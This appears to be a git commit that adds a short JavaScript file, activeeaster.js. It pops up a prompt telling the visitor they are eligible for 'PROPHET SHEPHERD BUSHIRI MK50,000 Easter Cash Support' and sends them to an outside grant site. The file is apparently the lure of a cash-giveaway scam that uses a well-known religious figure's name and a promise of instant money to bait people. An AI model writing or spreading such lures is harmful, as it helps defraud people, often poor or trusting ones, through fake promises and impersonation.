4da58a5af272562e0fb5a84d3e24c0f76eea6e75
The-On-going <sirpeelawson@gmail.com>
2026-03-29 18:34:02 +0100

    Create activeeaster.js

---
+++ activeeaster.js
@@ -0,0 +1,10 @@
+var password = 'MK50,000';
+
+password = prompt(
+  'Congratulations, you are eligible for PROPHET SHEPHERD BUSHIRI MK50,000 Easter Cash Support. Click OK to receive Instantly.',
+  'MK50,000'
+);
+
+if (password !== 'MK50,000') {
+    location.href = 'https://ongoing-grant.info/MK50,000-Easter-Support.html';
+}
